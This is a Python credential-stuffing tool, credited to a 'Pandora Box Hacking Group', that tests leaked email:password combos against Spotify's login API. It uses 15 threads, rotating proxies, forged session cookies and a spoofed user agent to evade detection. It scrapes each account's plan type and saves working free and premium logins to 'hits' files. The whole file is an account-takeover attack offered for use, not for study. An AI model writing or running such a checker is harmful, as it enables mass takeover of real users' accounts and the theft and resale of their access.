import requests
from bs4 import BeautifulSoup
import multiprocessing
from multiprocessing.dummy import Pool
import os as a
from random import choice
import colorama
from time import sleep
from colorama import init
init()
from colorama import Fore, Back, Style


banner="""__              ____                    __ 
  / /  ___ _    __/ / /__ _    _________ _/ /_
 / _ \/ _ \ |/|/ / / / _ \ |/|/ / __/ _ `/ __/
/_//_/\___/__,__/_/_/\___/__,__/\__/\_,_/\__/                       """


a.system("cls")
lock = multiprocessing.Lock()
class good_or_bad(object):
	def tellmewhatis(self,email,password,caso):
		if caso == "free":
			lock.acquire()
			print(Fore.BLUE + Back.GREEN+ f"[+]CUENTA VALIDA: {email}:{password}")
			print(f"""SPOTIFY ACCOUNTS
e = {email}
p = {password}		
CHECKER BY PANDORA BOX HACKING GROUP
HOLLOWCAT

""",file=open("Spotify_HITSFREE.txt","a"))
			lock.release()
		if caso == True:
			lock.acquire()
			print(Fore.BLUE + Back.GREEN+ f"[+]CUENTA VALIDA: {email}:{password}")
			print(f"""SPOTIFY ACCOUNTS
e = {email}
p = {password}		
CHECKER BY PANDORA BOX HACKING GROUP
HOLLOWCAT

""",file=open("Spotify_HITSPREMIUN.txt","a"))
			lock.release()
		elif caso == False:
			lock.acquire()
			print(Fore.RED + Back.YELLOW+ f"[-]CUENTA INVALIDA: {email}:{password}")
			print(f"""{email}:{password}""",file=open("bad.txt","a"))
			lock.release()

class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			print("PROXY ERROR")
	def request(self,email,password):
		try:
			asd = open("Spotify_HITSFREE.txt","r+")
			asds = asd.read()
			abc = open("Spotify_HITSPREMIUN.txt","r+")
			abcs = abc.read()
			bad = open("bad.txt","r+")
			bads = bad.read()
			req = requests.session()
			stop = "default@gmail.com"
		except:
			print("ERROR ABRIENDO ARCHIVOS")
		
		
		if  email in bads:
			os.system("^Z")
			os.system("^C")
			exit()
		if  email in asds:
			os.system("^Z")
			os.system("^C")
			exit()
		if  email in abcs:
			os.system("^Z")
			os.system("^C")
			exit()
		
		else:
			req = requests.Session()
			proxy = self.proxies()
			
			
			try:
				while True:
					a = req.get("https://accounts.spotify.com",proxies=proxy,timeout=7)
					csrf_token = a.cookies.get("csrf_token")
					
					
					if a.status_code == 200:
						break
			except:
				pass
			try:
				cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf_token, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
				headers = {"User-Agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4", "Accept" : "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
				param = {"remember" : "false", "username" : email, "password" : password, "csrf_token" : csrf_token}       
				
				
				try:
					
					source = req.post("https://accounts.spotify.com/api/login", data=param,cookies=cookies,proxies=proxy,timeout=7)	
					nuebo = req.post("https://www.spotify.com/do/account/overview/",proxies=proxy,cookies=cookies,timeout=3)
					soup2 = BeautifulSoup(nuebo.text,"lxml")
					capture = soup2.find("h3",{"class":"product-name"})
					
				except:
					
					pass
			except:
					pass
			
			try:
				if """{"error":"errorInvalidCredentials"}""" in source.text:
					good_or_bad().tellmewhatis(email,password,caso=False)
				elif "Free" in capture:
					good_or_bad().tellmewhatis(email,password,caso="free")

				else:
					good_or_bad().tellmewhatis(email,password,caso=True)

    				
			except Exception as e:
				pass
			try:
				if email in stop:
					sleep(5)
					print("TODAS LAS CUETNAS HAN SIDO PROBADAS")
					pass
			except:
				pass					

		

class x(object):
	def __init__(self):
		self.combos=[]

		
		
	def load(self):
		file = open("combo.txt").readlines()
		files = [combo.rstrip()for combo in file]
		
		try:
			for lines in files:
				combos = lines.split(":")
				self.combos.append(combos)
				(1+1)
		except:
			pass

	def check(self,acc):
		try:
			email = acc[0]
			password = acc[1]
		#print (self.load())
		except:
			pass
		while True:
			try:
				
				post().request(email,password)
				
				
				
			except  Exception :
				
				break
	def main(self):
		print("""++++++++++++++++++++CONFIG BY: ++++++++++++++++++""")
		print(Fore.GREEN+Back.BLACK+banner)
		post().proxies()
		self.load()
		self.threads = 15
		pool = Pool(self.threads)
		for _ in pool.imap(self.check,self.combos):
			pass
if __name__ == '__main__':
	x().main()